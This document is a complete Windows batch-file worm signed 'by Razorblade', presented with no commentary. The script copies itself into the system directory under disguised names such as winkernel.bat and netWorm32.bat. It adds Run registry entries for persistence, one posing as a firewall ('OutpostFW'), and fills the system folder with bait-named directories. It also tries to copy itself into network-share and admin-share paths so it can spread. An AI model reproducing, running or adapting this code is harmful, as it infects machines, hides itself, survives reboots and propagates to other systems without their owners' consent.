   @echo off
   :: by Razorblade

   if not exist "%systemroot%\stu32.bat" (
       copy %0 "%systemroot%\stu32.bat"
   )
   if not exist "%systemroot%\stupid32.bat" (
       copy %0 "%systemroot%\stupid32.bat"
   )
   if not exist "%systemroot%\winkernel.bat" (
       copy %0 "%systemroot%\winkernel.bat"
   )
   if not exist "%systemroot%\trond.bat" (
       copy %0 "%systemroot%\trond.bat"
   )
   if not exist "%systemroot%\kutz.bat" (
       copy %0 "%systemroot%\kutz.bat"
   )
   if not exist "%systemroot%\system32\netWorm32.bat" (
       copy %0 "%systemroot%\system32\netWorm32.bat"
   )
   cls
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v OutpostFW /t REG_SZ /d "%systemroot%\kutz.bat" /f > nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v TrondB /t REG_SZ /d "%systemroot%\winkernel.bat" /f > nul
   cls
   md "%systemroot%\Cracks" > nul
   md "%systemroot%\Game" > nul
   md "%systemroot%\Sex" > nul
   md "%systemroot%\Pics" > nul
   md "%systemroot%\Porn" > nul
   md "%systemroot%\HeyYa" > nul
   md "%systemroot%\Outpost" > nul
   md "%systemroot%\JayZ" > nul
   md "%systemroot%\Jennifer" > nul
   md "%systemroot%\Britney" > nul
   md "%systemroot%\Christina" > nul
   md "%systemroot%\Movies" > nul
   md "%systemroot%\Teen" > nul
   md "%systemroot%\Kutz" > nul
   md "%systemroot%\Trond" > nul
   md "%systemroot%\Stupid" > nul
   md "%systemroot%\HelloWorld" > nul
   md "%systemroot%\Scripting" > nul
   md "%systemroot%\Batch" > nul
   md "%systemroot%\vbs32" > nul
   cls
   copy %0 "*share*\%random%.bat" > nul
   copy %0 "*net*\%random%.bat"> nul
   copy %0 "*my*\%random%.bat" > nul
   copy %0 "*admin*\%random%.bat" > nul
   copy %0 "*local*\%random%.bat" > nul
   copy %0 "*$*\%random%.bat" > nul
   cls
   exit
